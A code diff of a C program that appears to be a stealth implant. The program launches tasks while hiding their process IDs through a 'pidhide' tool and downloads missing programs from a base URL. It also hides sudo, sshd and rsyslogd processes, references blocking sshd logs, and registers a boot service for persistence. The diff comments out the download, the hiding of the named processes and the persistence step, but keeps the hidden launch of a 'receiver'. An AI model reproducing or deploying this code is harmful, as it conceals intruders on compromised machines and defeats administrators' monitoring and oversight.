@@ -34,16 +34,16 @@ const char *programs[] = {
 pid_t run_task_and_hide(const char *cmd) {
     pid_t pid = fork();
     if (pid == 0) { // Child process for running the task
-        execlp(cmd, cmd, NULL);
-        perror("execlp"); // Executed only if execlp fails
+        execl(cmd, cmd, NULL);
+        perror("execl"); // Executed only if execl fails
         exit(1);
     } else if (pid > 0) { // Parent process
         pid_t hide_pid = fork();
         if (hide_pid == 0) { // Child process for hiding the PID
             char hide_cmd[256];
-            snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", pid);
-            execlp(hide_cmd, hide_cmd, NULL);
-            perror("execlp"); // Executed only if execlp fails
+            snprintf(hide_cmd, sizeof(hide_cmd), "-p %d", pid);
+            execl("/usr/sbin/pidhide", hide_cmd, NULL);
+            perror("execl"); // Executed only if execl fails
             exit(1);
         } else if (hide_pid < 0) { // Fork failed for hide_pid
             perror("fork");
@@ -387,19 +387,20 @@ int main(int argc, char *argv[]) {
     //block_sshd_log();
 
     // Loop through each program to check if it exists, if not download it
-    for (int i = 0; programs[i] != NULL; ++i) {
-        snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
-        if (access(local_file_path, F_OK) == -1) {
-            snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
-            download_file(local_file_path, cmd);
-        }
-    }
+    //for (int i = 0; programs[i] != NULL; ++i) {
+    //    snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
+    //    if (access(local_file_path, F_OK) == -1) {
+    //        snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
+    //        download_file(local_file_path, cmd);
+    //    }
+    //}
 
-    const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "rsyslogd", "sudoadd"};
-    combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
+    //const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "rsyslogd", "sudoadd"};
+    //combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
 
     // Create the service make sure this program runs every boot after network connection established
-    create_and_enable_service();
+    //create_and_enable_service();
+    
 
     // Run recevier
     run_task_and_hide("/usr/sbin/receiver");
